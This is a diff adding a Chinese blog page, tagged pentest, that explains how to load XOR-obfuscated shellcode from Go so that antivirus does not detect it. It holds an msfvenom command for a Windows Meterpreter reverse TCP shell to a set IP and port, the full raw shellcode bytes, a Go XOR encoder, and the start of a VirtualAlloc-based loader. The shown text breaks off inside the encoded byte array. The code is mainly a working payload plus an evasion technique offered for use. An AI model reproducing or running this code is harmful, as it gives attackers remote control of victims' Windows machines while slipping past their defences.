@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>使用golang加载异或的shellcode免杀 | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="golang,pentest">
+    <meta name="description" content="用Python加载shellcode能有一定的免杀效果想必已经老生常谈了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢 用msfvenom生成一段shellcode1msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234 这里要注意一点：如">
+<meta name="keywords" content="golang,pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用golang加载异或的shellcode免杀">
+<meta property="og:url" content="https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/index.html">
+<meta property="og:site_name" content="七友">
+<meta property="og:description" content="用Python加载shellcode能有一定的免杀效果想必已经老生常谈了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢 用msfvenom生成一段shellcode1msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234 这里要注意一点：如">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191220094240-0280b88c-22ca-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191220095000-087600b6-22cb-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191220094615-82b02394-22ca-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191220094724-abce80cc-22ca-1.png">
+<meta property="og:updated_time" content="2019-12-20T01:58:25.714Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用golang加载异或的shellcode免杀">
+<meta name="twitter:description" content="用Python加载shellcode能有一定的免杀效果想必已经老生常谈了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢 用msfvenom生成一段shellcode1msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234 这里要注意一点：如">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191220094240-0280b88c-22ca-1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/byqiyou" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-friends"></i>
+                Friends
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">使用golang加载异或的shellcode免杀</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">使用golang加载异或的shellcode免杀</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-20T00:49:15.000Z" itemprop="datePublished" class="page-time">
+  2019-12-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+
+<article id="post-使用golang加载异或的shellcode免杀"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">使用golang加载异或的shellcode免杀</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-20 08:49:15" datetime="2019-12-20T00:49:15.000Z"  itemprop="datePublished">2019-12-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>用Python加载<code>shellcode</code>能有一定的免杀效果想必已经<strong>老生常谈</strong>了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢</p>
+<p>用<code>msfvenom</code>生成一段<code>shellcode</code><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>这里要注意一点：如果我们直接用go加载<code>shellcode</code>，会被部分av查杀，例如：火绒、<code>windows Defender</code>等等</p>
+<p>先把我们的shellcode异或一下，然后再加载。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	KEY_1 = <span class="number">55</span></span><br><span class="line">	KEY_2 = <span class="number">66</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	shellcode := []<span class="keyword">byte</span>{<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x78</span>, <span class="number">0x18</span>, <span class="number">0x0b</span>, <span class="number">0x02</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, </span><br><span class="line"><span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, </span><br><span class="line"><span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, </span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>, </span><br><span class="line"><span class="number">0x4b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x49</span>, <span class="number">0xbe</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xec</span>, <span class="number">0xa0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xbc</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xd2</span>, <span class="number">0xc0</span>, <span class="number">0xa8</span>, <span class="number">0x8d</span>, <span class="number">0x88</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe4</span>, </span><br><span class="line"><span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xf1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x68</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x5e</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, </span><br><span class="line"><span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, </span><br><span class="line"><span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, </span><br><span class="line"><span class="number">0xe8</span>, <span class="number">0x93</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, </span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7e</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5e</span>, <span class="number">0x89</span>, <span class="number">0xf6</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, </span><br><span class="line"><span class="number">0xc9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xf0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, </span><br><span class="line"><span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x0b</span>, <span class="number">0x2f</span>, <span class="number">0x0f</span>, <span class="number">0x30</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x4d</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0xe9</span>, <span class="number">0x3c</span>, </span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x75</span>, <span class="number">0xb4</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xe7</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,}</span><br><span class="line">	fmt.Print(<span class="string">"{"</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(shellcode); i++ {</span><br><span class="line">		fmt.Print(shellcode[i]^KEY_1^KEY_2, <span class="string">","</span>)</span><br><span class="line">	}</span><br><span class="line">	fmt.Print(<span class="string">"}"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>加载<code>shellcode</code><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"syscall"</span></span><br><span class="line">	<span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">	KEY_1                  = <span class="number">55</span></span><br><span class="line">	KEY_2                  = <span class="number">66</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">"ntdll.dll"</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">"RtlCopyMemory"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	xor_shellcode := []<span class="keyword">byte</span>{<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x6d</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x7</span>, <span class="number">0x25</span>, <span class="number">0x3d</span>, <span class="number">0x7a</span>, <span class="number">0xc2</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0xd9</span>, <span class="number">0x49</span>, <span class="number">0x14</span>, <span class="number">0x9</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x34</span>, <span class="number">0xb4</span>, <span class="number">0xbc</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0xb4</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x27</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0xfe</span>, <span class="number">0x37</span>, <span class="number">0x49</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x13</span>, <span class="number">0xf4</span>, <span class="number">0xd</span>, <span class="number">0x6d</span>, <span class="number">0x7e</span>, <span class="number">0x77</span>, <span class="number">0x7a</span>, <span class="number">0xf0</span>, <span class="number">0x7</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0xfe</span>, <span class="number">0xf5</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3d</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0x1</span>, <span class="number">0x12</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x25</span>, <span class="number">0xfe</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x55</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x96</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xbc</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x41</span>, <span class="number">0xfd</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa3</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0xd9</span>, <span class="number">0x34</span>, <span class="number">0xb4</span>, <span class="number">0xbc</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0xb4</span>, <span class="number">0x4d</span>, <span class="number">0x95</span>, <span class="number">0x0</span>, <span class="number">0x84</span>, <span class="number">0x39</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x51</span>, <span class="number">0x7d</span>, <span class="number">0x30</span>, <span 